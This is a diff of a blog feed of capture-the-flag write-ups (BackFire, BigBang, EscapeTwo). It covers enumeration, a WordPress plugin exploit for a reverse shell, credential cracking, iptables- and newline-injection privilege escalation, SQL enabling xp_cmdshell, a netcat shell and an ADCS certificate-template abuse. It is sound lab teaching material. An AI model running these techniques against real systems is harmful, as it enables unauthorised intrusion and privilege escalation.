+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_22.png" alt="image.png" /></p>
+
+<p>Update your public key in authorized keys file</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_23.png" alt="image.png" /></p>
+
+<p>No we are serge</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_24.png" alt="image.png" /></p>
+
+<p>Enumerating ways to run commands as root, find we have iptables sudo control</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_25.png" alt="image.png" /></p>
+
+<p>With a little search we find a way creating a new rule, which will later saved in other file, like /etc/passwd that would be a way to change root password, but this is not allowed in this machine</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_26.png" alt="image.png" /></p>
+
+<p>So perform this same attack but create a short public key and save it in root authorized keys</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_27.png" alt="image.png" /></p>
+
+<p>Show rules and Save it to log-in as root</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_28.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_29.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[BackFire]]></summary></entry><entry><title type="html">BigBang 1a4b9525529180969ab4c536d535c545</title><link href="https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289.html" rel="alternate" type="text/html" title="BigBang 1a4b9525529180969ab4c536d535c545" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289.html"><![CDATA[<h1 id="bigbang">BigBang</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, there are only two ports open</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image.png" alt="image.png" /></p>
+
+<p>Nothing much in port 80</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_1.png" alt="image.png" /></p>
+
+<p>We can login</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_2.png" alt="image.png" /></p>
+
+<p>We can also submit a form</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_3.png" alt="image.png" /></p>
+
+<p>To perform this is used buddyForms</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_4.png" alt="image.png" /></p>
+
+<p>Use whatweb tool to get more information about this web application, wordpress and php are on it</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_5.png" alt="image.png" /></p>
+
+<p>Enumerate and map this website using gobuster adding php extension</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_6.png" alt="image.png" /></p>
+
+<p>This is the same login page that we can be redirected in budyform</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_7.png" alt="image.png" /></p>
+
+<p>Another endpoint but nothing useful</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_8.png" alt="image.png" /></p>
+
+<p>Use wpscan to a more comprehensive about vulnerabilities present</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_9.png" alt="image.png" /></p>
+
+<p>Buddyforms plugin is present in here</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_10.png" alt="image.png" /></p>
+
+<p>To know a little more about it search this specific version, it says that we have to be a user with minimal permissions, when we submit a form we can see that we are automatically assigned as guest user which can be enough to attack</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_11.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_12.png" alt="image.png" /></p>
+
+<p>Download this exploit and follow its instructions to get a rev shell</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_13.png" alt="image.png" /></p>
+
+<p>We have access to some .php files, search for passwords</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_14.png" alt="image.png" /></p>
+
+<p>We have a good sign</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_15.png" alt="image.png" /></p>
+
+<p>Forward sql port  to access database locally</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_16.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_17.png" alt="image.png" /></p>
+
+<p>Access to this database</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_18.png" alt="image.png" /></p>
+
+<p>Before skip ssl</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_19.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_20.png" alt="image.png" /></p>
+
+<p>We have shawking creds</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_21.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_22.png" alt="image.png" /></p>
+
+<p>Got the user flags</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_23.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Digging a little bit we found another database, this time a local database</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_24.png" alt="image.png" /></p>
+
+<p>We can see if we could do something in this grafana service</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_25.png" alt="image.png" /></p>
+
+<p>Find the right port</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_26.png" alt="image.png" /></p>
+
+<p>Forward that port</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_27.png" alt="image.png" /></p>
+
+<p>But nothing useful in here</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_28.png" alt="image.png" /></p>
+
+<p>Download this local database</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_29.png" alt="image.png" /></p>
+
+<p>These tables are present</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_30.png" alt="image.png" /></p>
+
+<p>Developer creds are present</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_31.png" alt="image.png" /></p>
+
+<p>Use this to make it crackeable</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_32.png" alt="image.png" /></p>
+
+<p>And crack it</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_33.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_34.png" alt="image.png" /></p>
+
+<p>Access as developer with this creds</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_35.png" alt="image.png" /></p>
+
+<p>An application in here, download it locally</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_36.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_37.png" alt="image.png" /></p>
+
+<p>Use apktool to decompile it to see all we have</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_38.png" alt="image.png" /></p>
+
+<p>We are able to execute commands as sudo, but those commands are default ones, even that we also can specify a file where that command will be affect, we can imagine how the task is automated, it should be somethin like sudo <default command=""> <file>, we have control over the file and it is not sanitized which means we could make a line feed to execute another command as root</file></default></p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_39.png" alt="image.png" /></p>
+
+<p>get authenticated first</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_40.png" alt="image.png" /></p>
+
+<p>You can use this script</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_41.png" alt="image.png" /></p>
+
+<p>It looks like it fails</p>
+
+<p><img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_42.png" alt="image.png" /></p>
+
+<p>But if we do this</p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -p</code></p>
+
+<p>A shell with root is open and the machine is pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[BigBang]]></summary></entry><entry><title type="html">EscapeTwo 196b95255291806dafd8c49da5657ea7</title><link href="https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7.html" rel="alternate" type="text/html" title="EscapeTwo 196b95255291806dafd8c49da5657ea7" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7.html"><![CDATA[<h1 id="escapetwo">EscapeTwo</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>We have some initial credentials</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image.png" alt="image.png" /></p>
+
+<p>Anyways we also have to enumerate ports, useful information is retrieved, we have domain controler hostname</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_1.png" alt="image.png" /></p>
+
+<p>Enumerate users, action allowed thanks to rose credentials</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_2.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Check rose shares allowed and its permissions</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_3.png" alt="image.png" /></p>
+
+<p>That’s how we access to some accounting information</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_4.png" alt="image.png" /></p>
+
+<p>New credentials are found</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_5.png" alt="image.png" /></p>
+
+<p>We might try to use SQL port to connect and execute commands as sql_svc like</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="o">--</span> <span class="nx">Allow</span> <span class="nx">advanced</span> <span class="nx">configuration</span>
+<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">show advanced options</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">RECONFIGURE</span>
+
+<span class="o">--</span> <span class="nx">Enable</span> <span class="nx">xp_cmdshell</span>
+<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">RECONFIGURE</span><span class="p">;</span>
+
+<span class="o">--</span><span class="nx">Execute</span>
+<span class="nx">EXEC</span> <span class="nx">sp_configure</span> <span class="dl">'</span><span class="s1">xp_cmdshell</span><span class="dl">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">RECONFIGURE</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p><img src="/assets/images/cozyhosting/Untitled%209.png" alt="Untitled" /></p>
+<p>Confirm we have access, we use impacket-mysqlclient</p>
 
-<ul>
-  <li>Machine pwned
-<img src="/assets/images/cozyhosting/Untitled%2010.png" alt="Untitled" /></li>
-</ul>]]></content><author><name>GitHub User</name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[CozyHosting]]></summary></entry></feed>
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_6.png" alt="image.png" /></p>
+
+<p>Now we have to do two steps forward, first upload in a specific directory netcat, and then execute it as it follow to gain a shell as this user</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_7.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_8.png" alt="image.png" /></p>
+
+<p>As this user we have access to database configuration</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_9.png" alt="image.png" /></p>
+
+<p>Check if this password is reused</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_10.png" alt="image.png" /></p>
+
+<p>WinRM port is open to access as ryan</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_11.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>As this box has much more users, and at this point we just have got access to three we could try to perform an Active Directory enumeration using SharpHound.exe</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_12.png" alt="image.png" /></p>
+
+<p>As we can see we could have control over CA_SVC account using write owner right</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_13.png" alt="image.png" /></p>
+
+<p>CA_SVC if member of some groups, that seems templates or something like that could be enrollable</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_14.png" alt="image.png" /></p>
+
+<p>Open write action using impacket-owneredit over ca_svc</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_15.png" alt="image.png" /></p>
+
+<p>Now modify acl to give ryan full control of ca_svc</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_16.png" alt="image.png" /></p>
+
+<p>As we owned ca_svc user we could use pywhisker tool to get a private certificate of ca_svc</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_17.png" alt="image.png" /></p>
+
+<p>Now we are able to request a Ticket Grant Ticket of this user</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_18.png" alt="image.png" /></p>
+
+<p>Get its NT hash to perform actions as this user</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_19.png" alt="image.png" /></p>
+
+<p>As previously saw, ca_svc is member of some cert groups, it might probably that user being vulnerable within its ADCS, check it using certipy</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_20.png" alt="image.png" /></p>
+
+<p>ESC4 is a misconfiguration which allow me to escalate privileges thanks to a write permission</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_21.png" alt="image.png" /></p>
+
+<p>I just need to update the configuration of the template to make it vulnerable to ESC1</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_22.png" alt="image.png" /></p>
+
+<p>Use this</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> certipy-ad template <span class="nt">-k</span> <span class="nt">-template</span> DunderMifflinAuthentication <span class="nt">-dc-ip</span> 10.10.XX.XX <span class="nt">-target</span> dc01.sequel.htb
+</code></pre></div></div>
+
+<p>Now we have are able to authenticate and enroll using an arbitrary subject alternative name SAN</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_23.png" alt="image.png" /></p>
+
+<p>Request a certificate using administrator as user principal name, this will retrieve a certificate of this template as administrator</p>
+
+<p><img src="/assets/images/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7/e7977474-9c5b-456b-b380-9765f21751a6-export-b755f7ae-8678-47ba-ae80-b27d7b8f45b7_image_24.png" alt="image.png" /></p>
+
